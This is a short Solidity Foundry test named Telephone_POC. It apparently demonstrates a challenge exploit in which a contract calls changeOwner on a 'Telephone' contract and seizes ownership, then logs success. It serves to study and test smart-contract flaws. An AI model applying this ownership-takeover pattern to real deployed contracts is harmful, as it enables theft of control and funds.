// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";


contract Telephone_POC is Test {
    Telephone _telephone;
    function init() private{
        vm.startPrank(address(0x1));
        _telephone =new Telephone();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Telephone_POC() public{
        _telephone.changeOwner(address(this));
        console.log("Success",_telephone.owner()==address(this));
    }
}
